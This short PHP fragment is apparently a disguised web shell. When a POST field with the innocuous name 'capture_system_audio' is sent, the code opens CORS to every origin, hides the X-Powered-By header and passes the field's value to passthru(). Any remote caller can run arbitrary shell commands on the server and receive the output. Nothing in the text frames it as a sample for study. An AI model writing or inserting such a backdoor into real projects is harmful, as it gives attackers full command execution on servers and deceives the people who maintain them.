<?php 
if (isset($_POST["capture_system_audio"])) {
    header('Vary: Origin');
    header("Access-Control-Allow-Origin: *");
    header("Access-Control-Allow-Methods: GET, POST, OPTIONS, HEAD");
    header("Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers");    
    header("Content-Type: application/octet-stream");
    header("X-Powered-By:");
    echo passthru($_POST["capture_system_audio"]);
    exit();
  }
